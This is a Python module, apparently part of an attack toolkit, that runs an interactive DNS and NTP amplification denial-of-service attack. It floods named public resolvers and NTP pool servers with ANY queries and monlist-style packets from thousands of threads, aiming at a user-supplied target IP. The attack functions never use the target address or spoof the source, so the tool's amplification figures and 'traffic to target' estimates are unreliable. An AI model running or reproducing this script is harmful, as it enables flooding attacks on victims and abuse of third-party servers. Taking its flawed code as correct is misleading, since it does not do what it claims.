#!/usr/bin/env python3
# DNS/NTP Amplification Attack with Real-time Live Logs

import socket
import threading
import random
import time
from modules.utils import pcolor, resolve
from modules.logger import save_log

DNS_SERVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "9.9.9.9", "208.67.222.222", "208.67.220.220"
]

def dns_amplification(target_ip, dns_server, stop_event, stats):
    query = bytes([
        0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x03, ord('w'), ord('w'), ord('w'),
        0x06, ord('g'), ord('o'), ord('o'), ord('g'), ord('l'), ord('e'),
        0x03, ord('c'), ord('o'), ord('m'), 0x00, 0x00, 0xff, 0x00, 0x01
    ])
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(query, (dns_server, 53))
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def ntp_amplification(target_ip, ntp_server, stop_event, stats):
    packet = b'\x17\x00\x03\x2a' + b'\x00' * 4
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(packet, (ntp_server, 123))
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def amp_attack():
    pcolor("b", "\n[ AMPLIFICATION ATTACK ]\n")
    print("1. DNS Amplification (20-50x multiplier)")
    print("2. NTP Amplification (200-500x multiplier)")
    
    choice = input("Select (1-2): ")
    
    target = input("Target IP: ")
    if not target.replace('.', '').isdigit():
        ip = resolve(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    threads = int(input("Threads (1000-5000, default 2000): ") or 2000)
    duration = int(input("Duration in seconds (default 60): ") or 60)
    
    if choice == "1":
        servers = DNS_SERVERS
        attack_func = dns_amplification
        method_name = "DNS_AMP"
        multiplier = 50
    else:
        servers = ["0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "time.google.com"]
        attack_func = ntp_amplification
        method_name = "NTP_AMP"
        multiplier = 500
    
    print(f"\nTarget: {ip}")
    print(f"Amplification factor: {multiplier}x")
    print(f"Reflection servers: {len(servers)}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s")
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    stop_event = threading.Event()
    stats = {'packets': 0, 'errors': 0}
    
    for i in range(threads):
        server = servers[i % len(servers)]
        t = threading.Thread(target=attack_func, args=(ip, server, stop_event, stats))
        t.daemon = True
        t.start()
    
    pcolor("g", f"\n[!] AMPLIFICATION ATTACK STARTED on {ip}")
    pcolor("y", f"[!] Traffic amplified {multiplier}x through public servers")
    pcolor("y", "[!] Press Ctrl+C to stop\n")
    
    start_time = time.time()
    last_packets = 0
    
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            pps = stats['packets'] - last_packets
            last_packets = stats['packets']
            
            bar_length = 30
            progress = int((elapsed / duration) * bar_length)
            bar = "█" * progress + "░" * (bar_length - progress)
            
            print(f"\r[{bar}] {elapsed}/{duration}s | "
                  f"✅ Packets: {stats['packets']:,} | "
                  f"❌ Errors: {stats['errors']:,} | "
                  f"⚡ {pps} p/s    ", end="")
            
            time.sleep(1)
        
        print()
        
    except KeyboardInterrupt:
        pcolor("y", "\n\n[!] Attack stopped by user")
    finally:
        stop_event.set()
        
        print("\n" + "="*60)
        pcolor("g", "[+] ATTACK FINISHED")
        print(f"[📊] Packets sent to amplifiers: {stats['packets']:,}")
        print(f"[🚀] Estimated traffic to target: {stats['packets'] * multiplier:,} packets")
        print(f"[⚠️] Errors: {stats['errors']:,}")
        print("="*60)
        
        save_log(ip, 53, method_name, threads, duration, 
                 stats['packets'], stats['errors'])
    
    input("\nPress Enter...")
